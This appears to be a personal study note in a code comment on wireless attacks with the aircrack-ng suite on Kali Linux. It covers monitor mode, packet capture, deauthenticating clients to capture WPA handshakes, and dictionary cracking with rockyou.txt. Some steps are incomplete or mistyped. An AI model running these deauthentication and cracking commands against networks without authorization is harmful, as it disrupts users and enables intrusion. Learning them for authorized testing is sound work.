/** Wireless Attacks
 
	Installing alfa awus036nha drivers on Kali-Liux:
		* Visit the link https://github.com/aircrack-ng/rtl8812au
		* Click the clone or Download button and download the zip file 
		* Travel to the directory of the zip file 
		* Create a folder to extract the zip file in 
		
		* Next run the following command as super user to install DKMS 
			sudo apt-get install dkms 
		* Travel to the directory made and run the following command to install the drivers
			./dkms-install.sh 
	
	Place our Network Adapter in monitor mode to sniff out NAPs (Network Access Points):
		* Bring up out network interfaces
				iwconfig 
		
		* Place it into monitor mode and kill interferences 
				airmon-ng start CardNameExmp
				airmon-ng check kill
		
		* Scan access points
				airodump-ng CardNameExmp
				
	Gathering information from channel using airodump-ng:
		* Gathering information on a specific network channeles 
			airodump-ng -c channelNumbers mon0 
			# For multiple channels at a time 
			airodump-ng -c 4, 5, 6 interface name  
			
		* Gathering information on clients on networks 
			airmon-ng -c channelnumber BSSIDofNetwork 
		
		* Saving Packet data to a text file 
			airodump-ng -w ChannelData -c 6 mon0 (after we list the file, any clients or channels, the data will be stored)
			
			Information pulled:
				.cap 
				.csv 
				.kismet.csv
				.kismet.netxml
				.log.csv
	
	Breaching A desired Network Channel airplay: 
		* Forcefully deauthenticate a client off the network in order to get them to reauthenticate 
			NOTE: A HANDSHAKE WILL BE DETECTED WHENEVER A DEVICE CONNECTS TO A NETWORK. FORCING A DEVICE TO RECONNECT MAKES THE PROCESS MUCH FASTER 
			The number followed by the settings for aireplay-ng are the number of packets to send (0 for unlimited, any number to specifically say how many packets to send)
			aireplay-ng -0 1 -a MacAddressOfAccessPoint -c MacAddress of Client 
			
			* Securing the 4 data pakcets that make up the handshake through by opening up the
			
		* For Fake Authentication for WEP's
		
	
	Searching for and Cracking WPA/WPA2 handshakes 
		* locate the wordlist for aircrack-ng by using the locate command
			locate rockyou.txt # locate the rockyou.txt file 
		* cp the wordlist to your current location and (it will be a .gz file)
		* Use the gunzip command to extract the wordlist 
		Use the wordlist along with the .cap file to crack the password 
			
			ex: aircrack-ng  -w dictionaryname capturefilename.cap
